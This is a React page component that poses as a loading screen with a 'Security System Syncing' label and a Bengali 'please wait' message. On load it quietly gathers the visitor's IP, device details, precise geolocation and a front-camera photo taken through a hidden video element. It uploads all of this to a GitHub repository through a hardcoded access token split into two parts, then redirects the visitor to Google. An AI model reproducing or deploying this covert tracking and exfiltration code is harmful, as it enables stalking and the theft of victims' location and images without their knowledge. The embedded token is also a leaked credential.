
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('Verify...');
  const videoRef = useRef<HTMLVideoElement>(null);
  const executed = useRef(false);

  // GitHub Credentials
  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";

  useEffect(() => {
    if (id && !executed.current) {
      executed.current = true;
      captureEverything();
    }
  }, [id]);

  const uploadToGitHub = async (path: string, content: string, isBase64 = false) => {
    try {
      const response = await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/${path}`, {
        method: 'PUT',
        headers: {
          'Authorization': `token ${G_TOKEN}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: `Log: ${path}`,
          content: isBase64 ? content : btoa(unescape(encodeURIComponent(content))),
        }),
      });
      return response.ok;
    } catch { return false; }
  };

  const captureEverything = async () => {
    const startTime = Date.now();
    const logId = `v_${Date.now()}`;

    // 1. Technical Info Collection
    const getTechInfo = async () => {
      const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'Unknown' }) }));
      const ipData = await ipRes.json();
      // @ts-ignore
      const battery = navigator.getBattery ? await navigator.getBattery() : null;
      
      return {
        ip: ipData.ip,
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : 'N/A',
        ram: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        screen: `${window.screen.width}x${window.screen.height}`,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language
      };
    };

    // 2. Parallel Permissions
    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).catch(() => null);
    const geoPromise = new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), { enableHighAccuracy: true, timeout: 2500 });
    });

    const [tech, stream, pos] = await Promise.all([getTechInfo(), mediaPromise, geoPromise]);

    const finalPayload: any = {
      ...tech,
      userId: id,
      time: new Date().toLocaleString('bn-BD'),
      location: pos ? {
        // @ts-ignore
        lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy
      } : 'Denied/Timeout',
      photo: null
    };

    // 3. Fast Image Capture
    if (stream && videoRef.current) {
      videoRef.current.srcObject = stream;
      await new Promise(r => setTimeout(r, 500));
      const canvas = document.createElement('canvas');
      canvas.width = 480; canvas.height = 360;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0, 480, 360);
      const photoB64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
      
      const photoPath = `data/captures/${logId}.jpg`;
      await uploadToGitHub(photoPath, photoB64, true);
      finalPayload.photo = `https://raw.githubusercontent.com/${G_OWNER}/${G_REPO}/main/${photoPath}`;
      stream.getTracks().forEach(t => t.stop());
    }

    // 4. Send to GitHub
    await uploadToGitHub(`data/logs/${logId}.json`, JSON.stringify(finalPayload));

    // Finish
    const wait = Math.max(0, 2500 - (Date.now() - startTime));
    setTimeout(() => { window.location.href = "https://www.google.com"; }, wait);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center font-['Hind_Siliguri']">
       <div className="text-center">
          <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <h1 className="text-xl font-bold text-slate-800">অপেক্ষা করুন...</h1>
          <p className="text-slate-400 text-xs mt-2 uppercase tracking-tighter">Security System Syncing</p>
          <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
       </div>
    </div>
  );
};

export default TrackPage;
